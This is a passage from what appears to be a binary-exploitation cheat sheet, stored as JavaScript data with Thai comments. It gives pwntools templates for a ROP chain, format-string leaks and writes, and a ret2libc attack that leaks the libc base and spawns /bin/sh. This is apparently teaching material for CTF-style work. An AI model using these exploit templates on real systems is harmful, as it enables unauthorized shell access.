p.send(b'payload')
resp = p.recvuntil(b'> ')
resp = p.recvline()

p.interactive()  # drop to shell`},
{label:'ROP chain',body:`rop = ROP(elf)
rop.raw(rop.ret)           # stack alignment (16-byte)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = flat({
    offset: rop.chain()
})
p.sendline(payload)`},
{label:'Format string attack',body:`# Leak stack value ที่ offset 6
p.sendline(b"%6$p")
leak = int(p.recvline().strip(), 16)

# Leak canary (offset ต้องหาก่อน)
payload = b"%15$p"  # ลอง offset ต่างๆ

# Write to address (%n)
payload = fmtstr_payload(offset, {target_addr: value})`},
{label:'ret2libc (ASLR bypass)',body:`# Step 1: leak libc base
payload_leak = b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
p.sendline(payload_leak)
leaked_puts = u64(p.recvuntil(b'\\n').strip().ljust(8, b'\\x00'))
libc_base = leaked_puts - libc.sym['puts']

# Step 2: call system("/bin/sh")
system = libc_base + libc.sym['system']
binsh  = libc_base + next(libc.search(b'/bin/sh'))
payload = b'A'*offset + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()`}],
tips:['ใช้ cyclic(200) + cyclic_find($rsp) หา offset','stack alignment: เพิ่ม p64(pop_ret) ก่อน system call'],
